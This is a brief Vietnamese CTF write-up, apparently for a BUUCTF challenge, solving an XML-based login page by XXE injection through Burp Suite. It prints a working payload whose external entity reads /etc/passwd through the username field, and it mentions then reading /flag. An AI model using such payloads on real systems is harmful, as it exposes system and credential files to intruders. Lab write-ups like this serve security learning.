Theo tên của challenge thì ta biết đây là dạng xml.Challenge cho ta trang web có chức năng đăng nhập

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/df756d50-522e-4669-a0c5-bd693e68c467)

Tiếp theo thử login vào.Mình sử dụng burpsuite để bắt gói tin.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/b988d590-8bfd-4b56-88bc-31105019a37b)

Username và password theo form xml,đây là dạng ta [exploit xxe để lấy file](https://github.com/Llam-a/XML-external-entity-XXE-injection/blob/main/Exploiting-XXE-to-retrieve%20files.md)

Payload:
```
<!DOCTYPE product [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><username>&xxe;</username><password>123</password></user>
```

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/52774798-1b09-49ab-9202-2ac8c23d360c)

Kết quả trả về của file /etc/passwd.Sau đó thử file /flag 

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/af02c107-88a6-4c83-921e-b484b90eb097)

